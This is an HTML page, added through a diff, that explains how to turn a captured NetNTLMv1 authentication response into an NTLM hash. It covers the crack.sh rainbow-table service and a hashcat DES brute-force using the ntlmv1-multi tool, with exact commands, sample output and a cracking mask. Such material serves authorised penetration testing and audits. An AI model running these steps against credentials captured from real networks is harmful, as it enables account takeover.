@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Crack NetNTLMv1 Into NTLM Hash</title>
+</head><body>You can use a set of Rainbow Tables to reverse the NTHASH to NTLM, or you can reverse it to its DES constituent components and crack it with hashcat. <br/>
+&nbsp;<br/>
+An 8x 1080 rig can brute force it in about 6 days, so consider Rainbow Tables.<br/>
+<br/>
+<b>&nbsp;Rainbow Tables </b><ul><li>For Rainbow Tables, there is a service hosted at <a href="https://crack.sh/netntlm/">https://crack.sh/netntlm/</a>&nbsp;that will recover NTLM from NetNTLMv1 for free. This is provided by David Hulton of Toorcon. We're working on a local copy of the rainbow tables and software that does not require and FPGA for lookups.</li>
+<li>For crack.sh, the format is NTHASH:(response), so NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 from the example.</li>
+</ul>
+<br/>
+<b>Or Cracking Them with hashcat </b><ul><li>&nbsp;@evil_mog's <a href="https://github.com/evilmog/ntlmv1-multi">ntlmv1-multi</a>&nbsp;tool below can break them</li>
+</ul>
+python ntlmv1.py --nossp SERVER$::DOMAIN:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972:1122334455667788 <br/>
+<br/>
+This will return the below output with instructions:<br/>
+&nbsp;Hashfield Split: ['SERVER$', '', 'DOMAIN', 'F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972', 'F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972', '1122334455667788'] <br/>
+Hostname: DOMAIN <br/>
+Username: SERVER$ <br/>
+Challenge: 1122334455667788 <br/>
+<br/>
+LM Response: F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 <br/>
+NT Response: F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 <br/>
+<br/>
+CT1: F35A3FE17DCB31F9 <br/>
+CT2: BE8A8004B3F310C1 <br/>
+CT3: 50AFA36195554972 <br/>
+<br/>
+To Calculate final 4 characters of NTLM hash use: <br/>
+./ct3_to_ntlm.bin 50AFA36195554972 1122334455667788 <br/>
+<br/>
+To crack with hashcat create a file with the following contents: <br/>
+F35A3FE17DCB31F9:1122334455667788 <br/>
+BE8A8004B3F310C1:1122334455667788 <br/>
+<br/>
+To crack with hashcat: <br/>
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1 &nbsp;</body></html>
